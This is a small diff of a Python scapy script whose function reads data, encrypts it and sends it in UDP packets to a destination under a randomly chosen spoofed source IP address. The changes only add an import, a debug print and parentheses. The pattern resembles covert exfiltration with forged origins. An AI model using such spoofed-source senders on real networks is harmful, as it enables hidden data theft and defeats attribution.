@@ -4,6 +4,7 @@ import socket
 import random
 import argparse
 import ipaddress
+import base64
 
 #scapy and other libraries
 from scapy.all import *
@@ -89,9 +90,10 @@ def different_src():
 #means to send encrypted data
 def src_ip_encrypted():
     fullData = mE.readAll()
-    encryptedData = mE.encryptFull(fullData)
+    encryptedData = mE.encryptFull(fullData) #return byte string
+    print(encryptedData)
     new_src = different_src()
-    sample_pkt = IP(src=new_src, dst=dst_ip)/UDP(dport=PORT)/Raw(load=encryptedData)
+    sample_pkt = IP(src=new_src, dst=dst_ip)/UDP(dport=PORT)/Raw(load=(encryptedData))
     send(sample_pkt)
 
 print(ip_mode)
